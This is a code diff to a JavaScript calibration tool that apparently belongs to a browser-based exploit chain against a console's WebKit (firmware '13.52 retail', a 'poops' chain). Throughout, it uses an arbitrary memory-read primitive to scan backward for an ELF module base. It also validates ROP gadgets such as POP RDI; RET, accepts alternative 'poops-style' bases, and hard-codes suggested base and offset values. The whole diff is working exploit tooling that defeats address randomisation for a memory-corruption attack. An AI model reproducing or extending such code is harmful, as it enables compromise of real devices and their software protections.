@@ -19,7 +19,7 @@ let lengthMissStreak = 0;
 const calRetain = [];
 
 const LOG_MAX = 500;
-const BUILD_ID = "cal-20250827d";
+const BUILD_ID = "cal-20250827e";
 const CAL_ALIGN_STEP = 0x4000;
 const ELF_MAGIC = 0x464c457f;
 /** 13.52 retail test anchor — assumed correct unless cal proves otherwise */
@@ -204,7 +204,7 @@ const SS_FIND_BASE_I = "wk-cal-findbase-i";
 const SS_VTABLE_FIND_I = "wk-cal-vtable-find-i";
 const SS_VTABLE_PTR = "wk-vtablePtr";
 
-const PIN_TAGS = /^WEBCORE|^CELL-SCAN|^TEXTAREA|^VTABLE|^MODULE-HIT|^CAL-ELF|^WALK-ANCHOR|^BOOT|^AUTO\b/;
+const PIN_TAGS = /^WEBCORE|^CELL-SCAN|^TEXTAREA|^VTABLE|^MODULE-HIT|^CAL-ELF|^CAL-MODULE|^ELF-|^WALK-ANCHOR|^BOOT|^AUTO\b|^GADGET/;
 const pinnedLines = [];
 
 function renderOut() {
@@ -655,10 +655,11 @@ function probePsFreeTextareaChain(p, cell, label) {
     };
 }
 
-function elfBaseNear(p, hitPage, maxBack) {
-    const start = ptrNum(hitPage) & ~(CAL_ALIGN_STEP - 1);
+function findElfBackward(p, startPtr, maxBack, stepSize) {
+    const step = stepSize > 0 ? stepSize : CAL_ALIGN_STEP;
+    const start = ptrNum(startPtr) & ~(step - 1);
     for (let i = 0; i <= maxBack; i++) {
-        const addrNum = start - i * CAL_ALIGN_STEP;
+        const addrNum = start - i * step;
         if (addrNum <= 0x100000) break;
         const b = ptrFromNum(addrNum);
         if (read4p(p, b) === ELF_MAGIC) return b;
@@ -666,20 +667,43 @@ function elfBaseNear(p, hitPage, maxBack) {
     return null;
 }
 
+function elfBaseNear(p, hitPage, maxBack) {
+    let elf = findElfBackward(p, hitPage, maxBack, CAL_ALIGN_STEP);
+    if (elf) return elf;
+    return findElfBackward(p, hitPage, Math.min(maxBack * 4, 8192), 0x1000);
+}
+
 function ensureElfModuleBase(p, base, maxBack) {
     if (!p || !base) return { base, elf: false, refined: false };
     maxBack = maxBack > 0 ? maxBack : 2048;
     const w0 = read4p(p, base);
     if (w0 === ELF_MAGIC) return { base, elf: true, refined: false };
+    const kind = classifyModulePage(p, base);
     const elf = elfBaseNear(p, base, maxBack);
     if (elf) {
-        mark("ELF-REFINE", "walk hit " + base + " -> module ELF base " + elf
-            + " (RVAs are relative to ELF base, not .text page)");
+        mark("ELF-REFINE", "walk hit " + base + " -> ELF module base " + elf);
         return { base: elf, elf: true, refined: true };
     }
-    const kind = classifyModulePage(p, base);
-    mark("ELF-MISS-REFINE", "no ELF within " + maxBack + " pages back of " + base
-        + (kind ? " (page kind=" + kind + ")" : ""));
+    if (kind === "text" || kind === "data") {
+        mark("ELF-INFO", "poops-style base " + base + " (" + kind + " @+0 — OK like chain_poops)");
+        return { base, elf: false, refined: false, poopsBase: true, kind };
+    }
+    if (nativeFn && tableOff && checkGadgetBytes(p, base, tableOff.wk_POP_RDI_RET, [0x5f, 0xc3])) {
+        mark("ELF-INFO", "base " + base + " — POP_RDI gadget OK (poops-style base)");
+        return { base, elf: false, refined: false, poopsBase: true, kind: "gadget" };
+    }
+    const extra = [];
+    if (nativeFn) extra.push(nativeFn);
+    if (vtablePtr) extra.push(vtablePtr);
+    for (let i = 0; i < extra.length; i++) {
+        const e2 = elfBaseNear(p, extra[i], maxBack);
+        if (e2) {
+            mark("ELF-REFINE", "via " + extra[i] + " -> ELF base " + e2);
+            return { base: e2, elf: true, refined: true, via: extra[i] };
+        }
+    }
+    mark("ELF-MISS-REFINE", "no ELF scan hit at " + base
+        + (kind ? " kind=" + kind : "") + " — verify uses poops-style if text/gadget OK");
     return { base, elf: false, refined: false, kind };
 }
 
@@ -842,9 +866,11 @@ function tryElfOnce(p, fn, delta) {
 
 function applyBaseFound(base, via) {
     const p = window.p;
+    let poopsStyle = false;
     if (p) {
         const refined = ensureElfModuleBase(p, base, 2048);
         base = refined.base;
+        poopsStyle = !!refined.poopsBase;
     }
     let delta = nativeFn ? impliedExpm1FromBase(nativeFn, base) : 0;
     try {
@@ -864,7 +890,8 @@ function applyBaseFound(base, via) {
     const elfPeek = p ? read4p(p, base) : null;
     mark("CAL-ELF-HIT", via + " base=" + base
         + (delta > 0 ? " expm1=0x" + delta.toString(16) : "")
-        + (elfPeek === ELF_MAGIC ? " ELF=ok" : " ELF=" + fmtMagic(elfPeek)));
+        + (elfPeek === ELF_MAGIC ? " ELF=ok"
+            : (poopsStyle ? " poops-base=ok" : " peek=" + fmtMagic(elfPeek))));
 }
 
 function applyElfHit(delta, base) {
@@ -1512,33 +1539,48 @@ async function runVerifyStep() {
         if (step === 0) {
             let useBase = base;
             let magic = read4p(p, useBase);
-            if (magic !== ELF_MAGIC) {
-                const refined = ensureElfModuleBase(p, useBase, 2048);
-                useBase = refined.base;
-                magic = read4p(p, useBase);
-                if (magic === ELF_MAGIC && ptrNum(useBase) !== ptrNum(base)) {
-                    manualBase = useBase;
-                    base = useBase;
-                    try { sessionStorage.setItem(SS_MANUAL_BASE, String(useBase)); } catch (_) { }
-                    if (baseIn) baseIn.value = ptrNum(useBase).toString(16);
-                    const nd = nativeFn ? impliedExpm1FromBase(nativeFn, useBase) : 0;
-                    if (nd > 0 && expm1In) expm1In.value = nd.toString(16);
-                    updateResultPanel();
+            const refined = ensureElfModuleBase(p, useBase, 2048);
+            useBase = refined.base;
+            magic = read4p(p, useBase);
+            if (ptrNum(useBase) !== ptrNum(base)) {
+                manualBase = useBase;
+                base = useBase;
+                try { sessionStorage.setItem(SS_MANUAL_BASE, String(useBase)); } catch (_) { }
+                if (baseIn) baseIn.value = ptrNum(useBase).toString(16);
+                const nd = nativeFn ? impliedExpm1FromBase(nativeFn, useBase) : 0;
+                if (nd > 0 && expm1In) expm1In.value = nd.toString(16);
+                updateResultPanel();
+            }
+
+            let stepOk = false;
+            if (magic === ELF_MAGIC) {
+                mark("CAL-ELF-OK", "ELF base=" + useBase);
+                stepOk = true;
+            } else {
+                const kind = classifyModulePage(p, useBase);
+                if (kind === "text" || kind === "data" || refined.poopsBase) {
+                    mark("CAL-MODULE-OK", "poops-style base=" + useBase
+                        + " kind=" + (kind || refined.kind || "gadget")
+                        + " peek=" + fmtMagic(magic));
+                    stepOk = true;
+                } else if (tableOff && checkGadgetBytes(p, useBase, tableOff.wk_POP_RDI_RET, [0x5f, 0xc3])) {
+                    mark("CAL-MODULE-OK", "base=" + useBase + " POP_RDI @+"
+                        + tableOff.wk_POP_RDI_RET.toString(16) + " OK");
+                    stepOk = true;
                 }
             }
-            if (magic !== ELF_MAGIC) {
+
+            if (!stepOk) {
                 clearVerifyProgress();
-                mark("CAL-FAIL", "ELF @ base=" + useBase + " got=" + fmtMagic(magic)
-                    + " want=0x464c457f");
-                mark("HINT", "walk hit .text page — ELF should be a few MB lower; refine failed");
-                mark("HINT", "paste ELF-MISS-REFINE line; or set base from CAL-ELF-HIT after re-Start");
-                state("ELF fail at step 1", "bad");
+                mark("CAL-FAIL", "step1 base=" + useBase + " got=" + fmtMagic(magic)
+                    + " — not ELF/text/gadget");
+                mark("HINT", "re-Start for vtable walk; or Set base 840cfc530 + expm1 eb6350");
+                state("verify step 1 fail", "bad");
                 return;
             }
-            mark("CAL-ELF-OK", "base=" + useBase);
             try { sessionStorage.setItem(SS_VSTEP, "1"); } catch (_) { }
             mark("CAL-MORE", "tap Verify step (" + 2 + "/" + totalSteps + ") for gadgets");
-            state("ELF ok — verify gadgets", "ok");
+            state("base OK — verify gadgets", "ok");
             return;
         }
 
